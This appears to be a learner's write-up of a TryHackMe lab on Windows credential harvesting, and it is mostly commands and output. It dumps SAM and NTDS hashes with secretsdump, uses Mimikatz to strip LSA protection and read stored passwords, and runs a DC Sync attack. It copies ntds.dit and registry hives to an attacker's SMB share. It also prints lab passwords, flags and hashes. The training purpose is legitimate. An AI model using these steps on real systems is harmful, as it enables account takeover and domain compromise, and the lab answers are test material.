# Credharvesting
![|777](https://tryhackme-images.s3.amazonaws.com/room-icons/1ab32f03262d2277c032ea836ef83bed.png)
- After gaining access to a system we need to find creds.

## Task 1 Intro
### Learning Objectives
- Understand the method of extracting credentials from local windows (SAM database)
- Learn how to access Windows memory and dump clear-text passwords and authentication tickets locally and remotely.
- Introduction to Windows Credentials Manager and how to extract credentials.
- Learn methods of extracting credentials for Domain Controller
- Enumerate the Local Administrator Password Solution (LAPS) feature.
- Introduction to AD attacks that lead to obtaining credentials.


## Task 2 Credential Harvesting
Credentials can be found in a variety of different forms, such as:
- Accounts details (usernames and passwords)
- Hashes that include NTLM hashes, etc.
- Authentication Tickets: Tickets Granting Ticket (TGT), Ticket Granting Server (TGS)
- Any information that helps login into a system (private keys, etc.)
## Task 3 Credential Access
Credentials are stored insecurely in various locations in systems:
-   Clear-text files
 -   Database files
 -   Memory
 -   Password managers
 -   Enterprise Vaults
 -   Active Directory
 -   Network Sniffing

### The following are some of the types of clear-text files that an attacker may be interested in:
- Commands history
-  Configuration files (Web App, FTP files, etc.)
- Other Files related to Windows Applications (Internet Browsers, Email Clients, etc.)
- Backup files
- Shared files and folders
- Registry
- Source code 

### As an example of a history command, a PowerShell saves executed PowerShell commands in a history file in a user profile in the following path: 
    C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt 

    
### Searching for the "password" keyword in the Registry        
- c:\Users\user> reg query HKLM /f password /t REG_SZ /s
- C:\Users\user> reg query HKCU /f password /t REG_SZ /s

Use the methods shown in this task to search through the Windows registry for an entry called "flag" which contains a password. What is the password?
Use findstr to grep THM text only

```
PS C:\Users\thm> reg query HKLM /f password /t REG_SZ /s | findstr flag
  flag    REG_SZ    password: 7tyh4ckm3
```    

Enumerate the AD environment we provided. What is the password of the victim user found in the description section?
Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description

```
PS C:\Users\thm> Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description

Name          SamAccountName Description
----          -------------- -----------
Administrator Administrator  Built-in account for administering the computer/domain
Guest         Guest          Built-in account for guest access to the computer/domain
krbtgt        krbtgt         Key Distribution Center Service Account
THM User      thm
THM Victim    victim         Change the password: Passw0rd!@#
thm-local     thm-local
Admin THM     admin
svc-thm       svc-thm
THM Admin BK  bk-admin
test          test-user
sshd          sshd
```
## Task 4 Local Windows Credentials
Confirming No Access to the SAM Database 
```
C:\Windows\system32>type c:\Windows\System32\config\sam
type c:\Windows\System32\config\sam
The process cannot access the file because it is being used by another process.

C:\Windows\System32> copy c:\Windows\System32\config\sam C:\Users\Administrator\Desktop\ 
copy c:\Windows\System32\config\sam C:\Users\Administrator\Desktop\
The process cannot access the file because it is being used by another process.
        0 file(s) copied.
```

Creating a Shadow Copy of Volume C with WMIC
- Be sure to run Administrator Command Prompt
```
C:\Users\Administrator>wmic shadowcopy call create Volume='C:\'
Executing (Win32_ShadowCopy)->create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ReturnValue = 0;
        ShadowID = "{D8A11619-474F-40AE-A5A0-C2FAA1D78B85}";
```
Listing the Available Shadow Volumes
```
C:\Users\Administrator>vssadmin list shadows
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Contents of shadow copy set ID: {0c404084-8ace-4cb8-a7ed-7d7ec659bb5f}
   Contained 1 shadow copies at creation time: 5/31/2022 1:45:05 PM
      Shadow Copy ID: {d8a11619-474f-40ae-a5a0-c2faa1d78b85}
         Original Volume: (C:)\\?\Volume{19127295-0000-0000-0000-100000000000}\
         Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
         Originating Machine: Creds-Harvesting-AD.thm.red
         Service Machine: Creds-Harvesting-AD.thm.red
         Provider: 'Microsoft Software Shadow Copy provider 1.0'
         Type: ClientAccessible
         Attributes: Persistent, Client-accessible, No auto release, No writers, Differential
```

Copying the SAM and SYSTEM file from the Shadow Volume
```
C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
        1 file(s) copied.

C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
        1 file(s) copied.
```
Save SAM and SYSTEM files from the registry
```
C:\Users\Administrator\Desktop>reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
The operation completed successfully.

C:\Users\Administrator\Desktop>reg save HKLM\system C:\users\Administrator\Desktop\system-reg
The operation completed successfully.
```
Decrypting SAM Database using Impacket SecretsDump Script Locally
```
           
user@machine:~# python3.9 /opt/impacket/examples/secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:98d3a787a80d08385cea7fb4aa2a4261:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up...
```
## Task 5 Local Security Authority Subsystem Service (LSASS)

- Disable Protected LSASS
-in admin cmd run ```cd C:\Tools\Mimikatz```
- ``` mimikatz.exe```


In 2012, Microsoft implemented an LSA protection, to keep LSASS from being accessed to extract credentials from memory. This task will show how to disable the LSA protection and dump credentials from memory using Mimikatz. To enable LSASS protection, we can modify the registry RunAsPPL DWORD value in HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa to 1.

- The steps are similar to the previous section, which runs the Mimikatz execution file with admin privileges and enables the debug mode. If the LSA protection is enabled, we will get an error executing the "sekurlsa::logonpasswords" command.
- Failing to Dump Stored Password Due to the LSA Protection

           mimikatz # sekurlsa::logonpasswords
           ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)

        

-The command returns a 0x00000005 error code message (Access Denied). Lucky for us, Mimikatz provides a mimidrv.sys driver that works on kernel level to disable the LSA protection. We can import it to Mimikatz by executing "!+" as follows,

Loading the mimidrv Driver into Memory

           
```mimikatz # !+
[*] 'mimidrv' service not present
[+] 'mimidrv' service successfully registered
[+] 'mimidrv' service ACL to everyone
[+] 'mimidrv' service started
``` 

- Note: If this fails with an isFileExist error, exit mimikatz, navigate to C:\Tools\Mimikatz\ and run the command again.
- Once the driver is loaded, we can disable the LSA protection by executing the following Mimikatz command:

### Removing the LSA Protection

    mimikatz # !processprotect /process:lsass.exe /remove
    Process : lsass.exe
    PID 528 -> 00/00 [0-0-0]
-Now, if we try to run the "sekurlsa::logonpasswords" command again, it must be executed successfully and show cached credentials in memory.


## Task 6 Windows Credential Manager
Credential Manager is a Windows feature that stores logon-sensitive information for websites, applications, and networks. It contains login credentials such as usernames, passwords, and internet addresses. There are four credential categories:

    Web credentials contain authentication details stored in Internet browsers or other applications.
    Windows credentials contain Windows authentication details, such as NTLM or Kerberos.
    Generic credentials contain basic authentication details, such as clear-text usernames and passwords.
    Certificate-based credentials: Athunticated details based on certifications.

- Note that authentication details are stored on the user's folder and are not shared among Windows user accounts. However, they are cached in memory.

Accessing Credential Manager

- We can access the Windows Credential Manager through GUI (Control Panel -> User Accounts -> Credential Manager) or the command prompt. In this task, the focus will be more on the command prompt scenario where the GUI is not available.

- We will be using the Microsoft Credentials Manager vaultcmd utility. Let's start to enumerate if there are any stored credentials. First, we list the current windows vaults available in the Windows target. 

```

Listing the Available Credentials from the Credentials Manager

           
C:\Users\Administrator>vaultcmd /list
Currently loaded vaults:
        Vault: Web Credentials
        Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28
        Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

        Vault: Windows Credentials
        Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29
        Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault

        


```

By default, Windows has two vaults, one for Web and the other one for Windows machine credentials. The above output confirms that we have the two default vaults.

Let's check if there are any stored credentials in the Web Credentials vault by running the vaultcmd command with /listproperties.

```

Checking if there Are any Stored Credentials in the "Web Credentials."

           
C:\Users\Administrator>VaultCmd /listproperties:"Web Credentials"
Vault Properties: Web Credentials
Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
Number of credentials: 1
Current protection method: DPAPI

        


```

The output shows that we have one stored credential in the specified vault. Now let's try to list more information about the stored credential as follows,

```

Listing Credentials Details for "Web Credentials"

           
C:\Users\Administrator>VaultCmd /listcreds:"Web Credentials"
Credentials in vault: Web Credentials

Credential schema: Windows Web Password Credential
Resource: internal-app.thm.red
Identity: THMUser Saved By: MSEdge
Hidden: No
Roaming: Yes

        


```

Credential Dumping

The VaultCmd is not able to show the password, but we can rely on other PowerShell Scripts such as Get-WebCredentials.ps1, which is already included in the attached VM.

Ensure to execute PowerShell with bypass policy to import it as a module as follows,

```

Getting Clean-text Password from Web Credentials

           
C:\Users\Administrator>powershell -ex bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> Import-Module C:\Tools\Get-WebCredentials.ps1
PS C:\Users\Administrator> Get-WebCredentials

UserName  Resource             Password     Properties
--------  --------             --------     ----------
THMUser internal-app.thm.red Password! {[hidden, False], [applicationid, 00000000-0000-0000-0000-000000000000], [application, MSEdge]}

        


```

The output shows that we obtained the username and password for accessing the internal application.

RunAs

An alternative method of taking advantage of stored credentials is by using RunAs. RunAs is a command-line built-in tool that allows running Windows applications or tools under different users' permissions. The RunAs tool has various command arguments that could be used in the Windows system. The /savecred argument allows you to save the credentials of the user in Windows Credentials Manager (under the Windows Credentials section). So, the next time we execute as the same user, runas will not ask for a password.

Let's apply it to the attached Windows machine. Another way to enumerate stored credentials is by using cmdkey, which is a tool to create, delete, and display stored Windows credentials. By providing the /list argument, we can show all stored credentials, or we can specify the credential to display more details /list:computername.


```

Enumerating for Stored Windows Credentials

           
C:\Users\thm>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=thm\thm-local
    Type: Domain Password
    User: thm\thm-local

        


```

The output shows that we have a domain password stored as the thm\thm-local user. Note that stored credentials could be for other servers too. Now let's use runas to execute Windows applications as the thm-local user. 

```

Run CMD.exe As a User with the /savecred argument

           
C:\Users\thm>runas /savecred /user:THM.red\thm-local cmd.exe
Attempting to start cmd.exe as user "THM.red\thm-local" ...

        


```

	A new cmd.exe pops up with a command prompt ready to use. Now run the whoami command to confirm that we are running under the desired user. There is a flag in the c:\Users\thm-local\Saved Games\flag.txt, try to read it and answer the question below.

Mimikatz

Mimikatz is a tool that can dump clear-text passwords stored in the Credential Manager from memory. The steps are similar to those shown in the previous section (Memory dump), but we can specify to show the credentials manager section only this time.

```

Dumping Memory for Credentials Manager

           
C:\Users\Administrator>c:\Tools\Mimikatz\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::credman

        


```

Apply this technique to the attached machine and answer the question below.

The techniques discussed in this task also could be done through other tools such as Empire, Metasploit, etc. You can do your own research to expand your knowledge.


```
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>powershell -ex bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> Import-Module C:\Tools\Get-WebCredentials.ps1
PS C:\Windows\system32> Get-WebCredentials

UserName Resource             Password     Properties
-------- --------             --------     ----------
THMuser  internal-app.thm.red E4syPassw0rd {[hidden, False], [applicationid, 00000000-0000-0000-0000-000000000000], ...


```


Apply the technique for extracting clear-text passwords from Windows Credential Manager. What is the password of the THMuser for internal-app.thm.red?
Using THM user access, check the Web Credentials.
*E4syPassw0rd*


```
mimikatz # sekurlsa::credman

Authentication Id : 0 ; 746421 (00000000:000b63b5)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 9/26/2022 4:16:30 PM
SID               : S-1-5-90-0-2
        credman :

Authentication Id : 0 ; 744851 (00000000:000b5d93)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 9/26/2022 4:16:29 PM
SID               : S-1-5-96-0-2
        credman :

Authentication Id : 0 ; 744759 (00000000:000b5d37)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 9/26/2022 4:16:29 PM
SID               : S-1-5-96-0-2
        credman :

Authentication Id : 0 ; 63677 (00000000:0000f8bd)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 9/26/2022 4:15:01 PM
SID               : S-1-5-90-0-1
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : CREDS-HARVESTIN$
Domain            : THM
Logon Server      : (null)
Logon Time        : 9/26/2022 4:14:59 PM
SID               : S-1-5-20
        credman :

Authentication Id : 0 ; 34485 (00000000:000086b5)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 9/26/2022 4:14:58 PM
SID               : S-1-5-96-0-1
        credman :

Authentication Id : 0 ; 34455 (00000000:00008697)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 9/26/2022 4:14:58 PM
SID               : S-1-5-96-0-0
        credman :

Authentication Id : 0 ; 34445 (00000000:0000868d)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 9/26/2022 4:14:58 PM
SID               : S-1-5-96-0-1
        credman :

Authentication Id : 0 ; 781648 (00000000:000bed50)
Session           : RemoteInteractive from 2
User Name         : thm
Domain            : THM
Logon Server      : CREDS-HARVESTIN
Logon Time        : 9/26/2022 4:16:33 PM
SID               : S-1-5-21-1966530601-3185510712-10604624-1114
        credman :
         [00000000]
         * Username : thm
         * Domain   : 10.10.237.226
         * Password : jfxKruLkkxoPjwe3
         [00000001]
         * Username : thm.red\thm-local
         * Domain   : thm.red\thm-local
         * Password : Passw0rd123

Authentication Id : 0 ; 781445 (00000000:000bec85)
Session           : RemoteInteractive from 2
User Name         : thm
Domain            : THM
Logon Server      : CREDS-HARVESTIN
Logon Time        : 9/26/2022 4:16:33 PM
SID               : S-1-5-21-1966530601-3185510712-10604624-1114
        credman :
         [00000000]
         * Username : thm
         * Domain   : 10.10.237.226
         * Password : jfxKruLkkxoPjwe3
         [00000001]
         * Username : thm.red\thm-local
         * Domain   : thm.red\thm-local
         * Password : Passw0rd123

Authentication Id : 0 ; 745669 (00000000:000b60c5)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 9/26/2022 4:16:29 PM
SID               : S-1-5-90-0-2
        credman :

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 9/26/2022 4:15:24 PM
SID               : S-1-5-17
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 9/26/2022 4:15:01 PM
SID               : S-1-5-19
        credman :

Authentication Id : 0 ; 63658 (00000000:0000f8aa)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 9/26/2022 4:15:01 PM
SID               : S-1-5-90-0-1
        credman :

Authentication Id : 0 ; 34424 (00000000:00008678)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 9/26/2022 4:14:58 PM
SID               : S-1-5-96-0-0
        credman :

Authentication Id : 0 ; 31587 (00000000:00007b63)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 9/26/2022 4:14:48 PM
SID               :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : CREDS-HARVESTIN$
Domain            : THM
Logon Server      : (null)
Logon Time        : 9/26/2022 4:14:48 PM
SID               : S-1-5-18
        credman :
```

Use Mimikatz to memory dump the credentials for the 10.10.237.226 SMB share which is stored in the Windows Credential vault. What is the password?
Remember to run Mimikatz as System Administrator!
*jfxKruLkkxoPjwe3*


	Run cmd.exe under thm-local user via runas and read the flag in "c:\Users\thm-local\Saved Games\flag.txt". What is the flag?

```
PS C:\Windows\system32> cmdkey /list

Currently stored credentials:

    Target: LegacyGeneric:target=10.10.237.226
    Type: Generic
    User: thm

    Target: Domain:interactive=thm.red\thm-local
    Type: Domain Password
    User: thm.red\thm-local

PS C:\Windows\system32> runas /savecred /user:THM.red\thm-local cmd.exe
Attempting to start cmd.exe as user "THM.red\thm-local" ...

is opened another window cmd

Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
thm\thm-local

C:\Windows\system32>more c:\Users\thm-local\Saved Games\flag.txt
Cannot access file C:\Users\thm-local\Saved

C:\Windows\system32>more "c:\Users\thm-local\Saved Games\flag.txt"
THM{RunA5S4veCr3ds}

C:\Windows\system32>
```


*THM{RunA5S4veCr3ds}*

### Domain Controller 

This task discusses the required steps to dump Domain Controller Hashes locally and remotely.

NTDS Domain Controller

New Technologies Directory Services (NTDS) is a database containing all Active Directory data, including objects, attributes, credentials, etc. The NTDS.DTS data consists of three tables as follows:

    Schema table: it contains types of objects and their relationships.
    Link table: it contains the object's attributes and their values.
    Data type: It contains users and groups.

NTDS is located in C:\Windows\NTDS by default, and it is encrypted to prevent data extraction from a target machine. Accessing the NTDS.dit file from the machine running is disallowed since the file is used by Active Directory and is locked. However, there are various ways to gain access to it. This task will discuss how to get a copy of the NTDS file using the ntdsutil and Diskshadow tool and finally how to dump the file's content. It is important to note that decrypting the NTDS file requires a system Boot Key to attempt to decrypt LSA Isolated credentials, which is stored in the SECURITY file system. Therefore, we must also dump the security file containing all required files to decrypt. 

Ntdsutil

Ntdsutil is a Windows utility to used manage and maintain Active Directory configurations. It can be used in various scenarios such as 

    Restore deleted objects in Active Directory.
    Perform maintenance for the AD database.
    Active Directory snapshot management.
    Set Directory Services Restore Mode (DSRM) administrator passwords.

For more information about Ntdsutil, you may visit the Microsoft documentation page.

Local Dumping (No Credentials)

This is usually done if you have no credentials available but have administrator access to the domain controller. Therefore, we will be relying on Windows utilities to dump the NTDS file and crack them offline. As a requirement, first, we assume we have administrator access to a domain controller. 

To successfully dump the content of the NTDS file we need the following files:

    C:\Windows\NTDS\ntds.dit
    C:\Windows\System32\config\SYSTEM
    C:\Windows\System32\config\SECURITY

	The following is a one-liner PowerShell command to dump the NTDS file using the Ntdsutil tool in the C:\temp directory.

```

Dumping the content of the NTDS file from the Victim Machine

           
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"

        


```

	Now, if we check the c:\temp directory, we see two folders: Active Directory and registry, which contain the three files we need. Transfer them to the AttackBox and run the secretsdump.py script to extract the hashes from the dumped memory file.

```

Extract hashes from NTDS Locally

           
user@machine$ python3.9 /opt/impacket/examples/secretsdump.py -security path/to/SECURITY -system path/to/SYSTEM -ntds path/to/ntds.dit local

        


```

Remote Dumping (With Credentials)

In the previous section, we discussed how to get hashes from memory with no credentials in hand. In this task, we will be showing how to dump a system and domain controller hashes remotely, which requires credentials, such as passwords or NTLM hashes. We also need credentials for users with administrative access to a domain controller or special permissions as discussed in the DC Sync section.

DC Sync

The DC Sync is a popular attack to perform within an Active Directory environment to dump credentials remotely. This attack works when an account (special account with necessary permissions) or AD admin account is compromised that has the following AD permissions:

    Replicating Directory Changes
    Replicating Directory Changes All
    Replicating Directory Changes in Filtered Set

An adversary takes advantage of these configurations to perform domain replication, commonly referred to as "DC Sync", or Domain Controller Sync. For more information about the DC Sync attack, you can visit the THM Persisting AD room (Task 2).

The Persisting AD room uses the Mimikatz tool to perform the DC Synchronisation attack. Let's demonstrate the attack using a different tool, such as the Impacket SecretsDump script. 


```

Performing the DC Sync Attack

           
user@machine$ python3.9 /opt/impacket/examples/secretsdump.py -just-dc THM.red/<AD_Admin_User>@10.10.53.63 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
thm.red\thm:1114:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::

        


```

Let's explain the command a bit more.

    the -just-dc argument is for extracting the NTDS data.
    the thm.red/AD_Admin_User is the authenticated domain user in the form of (domain/user).

Note if we are interested to dump only the NTLM hashes, then we can use the -just-dc-ntlm argument as follows,

```

The DC Sync Attack to Dump NTLM Hashes

           
user@machine$ python3.9 /opt/impacket/examples/secretsdump.py -just-dc-ntlm THM.red/<AD_Admin_User>@10.10.53.63

        


```

Once we obtained hashes, we can either use the hash for a specific user to impersonate him or crack the hash using Cracking tools, such hashcat. We can use the hashcat -m 1000 mode to crack the Windows NTLM hashes as follows:

```

Performing the DC Sync Attack

           
user@machine$ hashcat -m 1000 -a 0  /path/to/wordlist/such/as/rockyou.txt

        


```

```
PS C:\Windows\system32> powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
C:\Windows\system32\ntdsutil.exe: ac i ntds
Active instance set to "ntds".
C:\Windows\system32\ntdsutil.exe: ifm
ifm: create full c:\temp
Creating snapshot...
Snapshot set {85d6ff5d-2eb7-4d04-a6cc-a9c7dc68fb66} generated successfully.
Snapshot {aa1dfdec-d81e-4bb1-aa5c-b4f60b556a15} mounted as C:\$SNAP_202209261716_VOLUMEC$\
Snapshot {aa1dfdec-d81e-4bb1-aa5c-b4f60b556a15} is already mounted.
Initiating DEFRAGMENTATION mode...
     Source Database: C:\$SNAP_202209261716_VOLUMEC$\Windows\NTDS\ntds.dit
     Target Database: c:\temp\Active Directory\ntds.dit

                  Defragmentation  Status (omplete)

          0    10   20   30   40   50   60   70   80   90  100
          |----|----|----|----|----|----|----|----|----|----|
          ...................................................

Copying registry files...
Copying c:\temp\registry\SYSTEM
Copying c:\temp\registry\SECURITY
Snapshot {aa1dfdec-d81e-4bb1-aa5c-b4f60b556a15} unmounted.
IFM media created successfully in c:\temp
ifm: q
C:\Windows\system32\ntdsutil.exe: q

┌──(kali㉿kali)-[~/Downloads/share]
└─$ ls
sam.hive  system.hive
                                                                                                         
┌──(kali㉿kali)-[~/Downloads/share]
└─$ cd ..   
                                                                                                         
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username thm -password Passw0rd! public share
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.53.63,64978)
[*] AUTHENTICATE_MESSAGE (THM\thm,CREDS-HARVESTIN)
[*] User CREDS-HARVESTIN\thm authenticated successfully
[*] thm::THM:aaaaaaaaaaaaaaaa:88da16b35c4cd9d7e261874152048e75:010100000000000080814c9dccd1d8014c7f80d1161c212900000000010010006a0041004a0051004100560049007a00030010006a0041004a0051004100560049007a00020010004f004b006f005700470043006f006f00040010004f004b006f005700470043006f006f000700080080814c9dccd1d80106000400020000000800300030000000000000000000000000300000d862437e3a93e008dd01415997a795bf84ca70e23a3d532d03ebf7e88a358a690a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310031002e00380031002e003200320030000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:public)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:public)
[*] Closing down connection (10.10.53.63,64978)
[*] Remaining connections []
[*] Incoming connection (10.10.53.63,65008)
[*] AUTHENTICATE_MESSAGE (THM\thm,CREDS-HARVESTIN)
[*] User CREDS-HARVESTIN\thm authenticated successfully
[*] thm::THM:aaaaaaaaaaaaaaaa:fa6ac0bbc3a9b883902d487afac2b7b6:01010000000000000040508ccdd1d801296ccb79cbfd52df00000000010010006a0041004a0051004100560049007a00030010006a0041004a0051004100560049007a00020010004f004b006f005700470043006f006f00040010004f004b006f005700470043006f006f00070008000040508ccdd1d80106000400020000000800300030000000000000000000000000300000d862437e3a93e008dd01415997a795bf84ca70e23a3d532d03ebf7e88a358a690a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310031002e00380031002e003200320030000000000000000000
[*] Connecting Share(1:public)
[*] Disconnecting Share(1:public)
[*] Closing down connection (10.10.53.63,65008)
[*] Remaining connections []






Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd C:\temp\registry

C:\temp\registry>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\temp\registry

09/26/2022  05:16 PM    <DIR>          .
09/26/2022  05:16 PM    <DIR>          ..
06/13/2022  09:40 AM            65,536 SECURITY
06/13/2022  09:40 AM        20,971,520 SYSTEM
               2 File(s)     21,037,056 bytes
               2 Dir(s)  10,259,238,912 bytes free

C:\temp\registry>copy "C:\temp\registry\SECURITY" \\10.11.81.220\public\
        1 file(s) copied.

C:\temp\registry>copy "C:\temp\registry\SYSTEM" \\10.11.81.220\public\
        1 file(s) copied.

C:\temp\registry>cd C:\temp\Active Directory

C:\temp\Active Directory>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\temp\Active Directory

09/26/2022  05:16 PM    <DIR>          .
09/26/2022  05:16 PM    <DIR>          ..
09/26/2022  05:16 PM        25,165,824 ntds.dit
09/26/2022  05:16 PM            16,384 ntds.jfm
               2 File(s)     25,182,208 bytes
               2 Dir(s)  10,271,895,552 bytes free

C:\temp\Active Directory>copy "C:\temp\Active Directory\ntds.dit" \\10.11.81.220\public\
        1 file(s) copied.


┌──(kali㉿kali)-[~/Downloads/share]
└─$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -security SECURITY -system SYSTEM -ntds ntds.dit local 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:f71d0d25f88d5cdaaab86eaade4967ed558caa07b8b9314571427f3388b17f46322f097aed3e2d9f3eef08322dafd622fbc682019e0c23e0cf4d7690a033778d24da8f32798c4b6fa7daf2bdaaccdfe084f26aa7c7923c8a8ab86ddf33442ed6db7f240e373d467e4266a1d126a30a6fe222e322c57d8b5e5c6851dc65a6677cfbfdea6e7bcd943fa6442136aba7c2ba67dd56e9ec89e63ac5392cf7704e5f5983e6174b1bf2ada85a33099381ee4f5e6028728a5b4a978c9deb2a9ea47a897ce76fea1c20daea85f8ea11f324ab1c7e75eea2a4987d61d2b2f3af31aea9b34ec28ca7372630f20fc19d771f5482eb7e
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:9ea464f05e82b101c9d9a4736d5da673
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x0e88ce11d311d3966ca2422ac2708a4d707e00be
dpapi_userkey:0x8b68be9ef724e59070e7e3559e10078e36e8ab32
[*] NL$KM 
 0000   8D D2 8E 67 54 58 89 B1  C9 53 B9 5B 46 A2 B3 66   ...gTX...S.[F..f
 0010   D4 3B 95 80 92 7D 67 78  B7 1D F9 2D A5 55 B7 A3   .;...}gx...-.U..
 0020   61 AA 4D 86 95 85 43 86  E3 12 9E C4 91 CF 9A 5B   a.M...C........[
 0030   D8 BB 0D AE FA D3 41 E0  D8 66 3D 19 75 A2 D1 B2   ......A..f=.u...
NL$KM:8dd28e67545889b1c953b95b46a2b366d43b9580927d6778b71df92da555b7a361aa4d8695854386e3129ec491cf9a5bd8bb0daefad341e0d8663d1975a2d1b2
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 55db1e9562985070bbba0ef2cc25754c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc9b72f354f0371219168bdb1460af32:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
CREDS-HARVESTIN$:1008:aad3b435b51404eeaad3b435b51404ee:9ea464f05e82b101c9d9a4736d5da673:::
